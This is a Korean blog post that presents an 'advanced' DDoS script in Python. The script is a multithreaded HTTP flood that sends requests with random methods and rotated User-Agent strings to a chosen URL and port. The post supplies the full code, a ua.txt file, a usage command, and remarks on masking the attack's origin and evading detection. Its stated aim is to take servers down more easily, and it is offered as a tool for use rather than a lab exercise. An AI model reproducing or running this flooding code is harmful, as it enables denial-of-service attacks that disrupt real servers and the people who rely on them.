---
layout: single
title:  "윈도우에서 디도스 더 고도화 해서 날려보기"
categories: "Secure"
tag: "Secure"
toc: true
author_profile: false
sidebar:
    nav: "docs"
---

# 지난번의 코드의 연장선이다.  
지난번의 코드는, 뭔가 아쉬운 점이 많이 있었다.  
따라서 다음의 기능을 추가하여 더욱 효과적으로 디도스를 날릴 수 있따.  
아번 코드는 다중 스레드를 활용하여 더욱 효과적으로 패킷을 전송하며, 랜덤한 HTTP 메소드와 User-Agent를 사용한다.  
또한, 전송된 패킷 수와 실패한 패킷 수를 출력하여 진행 상황을 모니터링할 수 있다.  

```python
version = '3.1'

# 필요한 라이브러리 import
import re
import os
import sys
import time
import string
import signal
import http.client
import urllib.parse
from random import choice, randint
from socket import *
from threading import Thread
from argparse import ArgumentParser, RawTextHelpFormatter

# 사용자 입력 처리
def get_args():
    parser = ArgumentParser(formatter_class=RawTextHelpFormatter)
    parser.add_argument("-u", "--url", required=True, help="공격할 URL을 입력하십시오.")
    parser.add_argument("-p", "--port", default=80, type=int, help="공격할 포트 번호 (기본값: 80)")
    parser.add_argument("-t", "--threads", default=100, type=int, help="스레드 수 (기본값: 100)")
    parser.add_argument("-s", "--sleep", default=0, type=float, help="스레드 간 대기 시간 (초, 기본값: 0)")
    return parser.parse_args()

# 패킷 전송 방식 고도화 클래스
class AdvancedPyslow:
    def __init__(self, tgt, port, threads, sleep):
        self.tgt = tgt
        self.port = port
        self.threads = threads
        self.sleep = sleep
        self.method = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE']  # 다양한 HTTP 메소드
        self.user_agents = self.load_user_agents()  # User-Agent 목록 불러오기

    def load_user_agents(self):
        try:
            with open("./ua.txt", "r") as fp:
                return re.findall(r"(.+)\n", fp.read())
        except FileNotFoundError:
            print('[-] \'ua.txt\' 파일을 찾을 수 없습니다.')
            return []

    # 패킷 생성 함수
    def create_packet(self):
        method = choice(self.method)
        path = '/' + str(randint(1, 999999999))
        user_agent = choice(self.user_agents)
        return f"{method} {path} HTTP/1.1\r\nHost: {self.tgt}\r\nUser-Agent: {user_agent}\r\n\r\n"

    # 패킷 전송 함수
    def send_packet(self):
        try:
            with socket(AF_INET, SOCK_STREAM) as sock:
                sock.connect((self.tgt, self.port))
                packet = self.create_packet()
                sock.sendall(packet.encode())
                print(f"[+] 패킷 전송: {packet.strip()}")
        except Exception as e:
            print(f"[-] 패킷 전송 실패: {e}")

    # 스레드 실행 함수
    def run(self):
        threads = []
        for _ in range(self.threads):
            t = Thread(target=self.send_packet)
            t.start()
            threads.append(t)
            time.sleep(self.sleep)  # 스레드 간 대기 시간

        for t in threads:
            t.join()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal.SIG_DFL)  # Ctrl+C 시 기본 시그널 처리
    args = get_args()
    target_ip = gethostbyname(args.url)  # 도메인에서 IP 주소 얻기
    print(f"[+] 공격 대상: {args.url} ({target_ip})")
    
    # 패킷 전송 고도화 클래스 인스턴스 생성 및 실행
    attack = AdvancedPyslow(target_ip, args.port, args.threads, args.sleep)
    attack.run()

```  
### 코드 설명
다양한 HTTP 메소드: 
self.method 리스트에 GET, POST, HEAD, PUT, DELETE 메소드를 추가하여 패킷을 생성할 때 다양하게 날리게끔 하였다.  

스레드 실행: 
각 스레드가 패킷을 전송하도록 하여 공격 효과를 극대화 했다.  
각 스레드는 일정 시간 간격으로 대기하여 서버에 부하를 분산시킨다.  
이래놓고 개많이 보내면, 서버에 쌓이는 패킷이 기하급수적으로 늘어가 더 쉽게 서버를 다운 시킬 수 있따.  

패킷 생성 및 전송: 
패킷 생성 함수와 전송 함수가 분리되어 있어, 패킷을 전송할 때마다 새로운 패킷이 생성된다.  

사용자 입력 처리: 
argparse를 사용하여 명령줄 인자로 URL, 포트, 스레드 수, 대기 시간을 입력받을 수 있다.  

### 코드 사용 방법
먼저, 다음 파일을 준비해야 한다.  
ua.txt
```txt
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Mozilla/5.0 (Linux; Android 10; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1

```

ua.txt 파일에 User-Agent 목록을 넣는 것으로, 공격 대상 서버에 저 내용의 정보를 넘기게 된다.  
브라우저 이름, 버전, 운영 체제 등의 정보가 포함되어 있으며, 이 정보를 통해 공격한다.

위 코드를 사용하려면, 커널에 다음과 같이 하면 사용할 수 있다
```bash
python script.py -u example.com -p 80 -t 100 -s 0.1

```
ua.txt를 통해서 자신이 어디에서 공격하고 있는지 숨길 수 있긴 하다.  
하지만, 이게 완벽하게 숨겨지는것이 아니라, 저 목록 안의 내용중에서 무작위로 날려대는 것이기 때문에 내 위치가 들킬 수 도 있다.  
서버는 요청의 출처를 정확하게 식별하기 어려워져 나이스 하긴 하지만,  
다른 방식으로 공격을 감지할 수 있는 서버들도 많이 있다.  
요청의 빈도, IP 주소, 기타 패턴 분석 등을 통해 의심스러운 활동을 탐지당할 수 있기 때문에 저것 만으론 부족하다.  
